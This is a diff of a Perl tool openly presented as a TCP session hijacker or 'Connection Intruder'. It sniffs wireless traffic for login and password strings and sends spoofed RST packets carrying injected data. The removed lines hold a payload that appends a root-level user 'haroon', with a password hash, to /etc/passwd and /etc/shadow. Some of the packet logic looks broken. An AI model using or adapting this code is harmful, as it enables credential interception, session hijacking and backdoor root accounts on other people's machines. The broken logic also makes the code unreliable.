@@ -26,17 +26,19 @@ use NetPacket::Ethernet qw(:strip);
 use NetPacket::TCP;
 use NetPacket::IP qw(:strip);
 use Term::ANSIColor;
+use Net::RawIP;
+
 
 # Are you r00t?
 if($> != 0) { 
 die "You need EUID 0 to use this tool!\n\n";
 }
 
-# CLI GUI
+# CLI GUI ###########
 system ("clear");
 print color('bold red');
 print "\n\n					   	 	    Project";
-print "\n 						  : TCP-IP-Session-Hijacker :\n\n\n";
+print "\n 						  : TCP-IP Connection Intruder :\n\n\n";
 print color('bold yellow');
 print "[ + ] Programmer: 	Haroon Awan\n";
 print "[ + ] License: 		EULA\n";
@@ -44,7 +46,7 @@ print "[ + ] Version: 		1.0\n";
 print "[ + ] Contact: 		mrharoonawan\@gmail\.com \n";
 print "[ + ] Environment: 	Perl for Debian/Kali\n";
 print "[ + ] Github: 		Https://www.github.com/haroonawanofficial\n";
-print "[ + ] Design Scheme: 	This software will intrude any unencrypted protocol and execute data payload using target credentials stealthly\n";
+print "[ + ] Design Scheme: 	TCP-IP Connection Intruder will intrude any un-ecrypted protocol and execute strings in it\n";
 print color('reset');
 print color("bold green"),"\n[ + ] Starting TCP-IP Data Connection \n";
 print color("bold green"),"[ + ] Sitting between HUB/SWITCH \n";
@@ -55,13 +57,13 @@ print color("bold magenta"),"[ + ] Take caution, it's about to get really noisy 
 print color("bold white"),"[ + ] Loading Data Segments : \n";
 print color('reset');
 
-# Start sniffin in promisc mode
+# Start sniffin in promisc mode ###########
 Net::PcapUtils::loop(\&sniffit,
 Promisc => 1,
 FILTER => 'tcp',
 DEV => 'wlan0');
 
-# Callback
+# Callback ##########
 sub sniffit
             {
 my ($args,$header,$packet) = @_;
@@ -69,20 +71,21 @@ $ip = NetPacket::IP->decode(eth_strip($packet));
 $tcp = NetPacket::TCP->decode($ip->{data});
 $payload = $tcp->{data};
 
-if( ($payload =~ /USER|User|Username|username|USERNAME|Logging|LOGGING|Login|Log-in|login|LOGIN/) || ($payload =~ /PASS|Pass|Password|password|PASSWORD|LOGGED|logged|Welcome|WELCOME|welcome/) )
- {
-print color("bold white"),"[ + ] Got it\n";
-print color("bold white"),"[ + ] Injecting the data string\n\n";
-print color('reset');
- }
 print "|------------------------------------------------------------------------|\n";
 print "|  Source IP    -    Source Port  |  Destination IP  - Destination Port  |\n";
 print "| $ip->{src_ip}:$tcp->{src_port}		–>	$ip->{dest_ip}:$tcp->{dest_port} 	 	 |\n";
 print "|------------------------------------------------------------------------|\n";
-            }
+
+if( ($payload =~ /USER|User|Username|username|USERNAME|Logging|LOGGING|Login|Log-in|login|LOGIN/) || ($payload =~ /PASS|Pass|Password|password|PASSWORD|LOGGED|logged/) )
+ {
+print color("bold white on_red"),"\n\n[ + ] Got it\n";
+print color("bold white on_red"),"[ + ] Injecting the data string\n\n";
+print color('reset');
+ }
 
 
 # Packet Library Start ############
+$packet = new Net::RawIP;
 $packet->set({
 ip => { saddr => $ip->{dest_ip},
 daddr => $ip->{src_ip}
@@ -91,14 +94,11 @@ tcp => { source => $tcp->{dest_port},
 dest => $tcp->{src_port},
 rst => 1,
 seq => $ip->{acknum},
-#Inject data
-data => 'echo haroon:x:0:0::/:/bin/sh >> /etc/passwd && echo haroon:\$1\$u70t2mzi\$v8VeFsr3uFwbl772vjb/a0:12019:0:99999:7::: >> /etc/shadow'
+data => 'injection'
 }
 });
 
+
 $packet->send(0,1);
 
-unless($tcp->{flags} == 2)
-{
-return 1;
 }
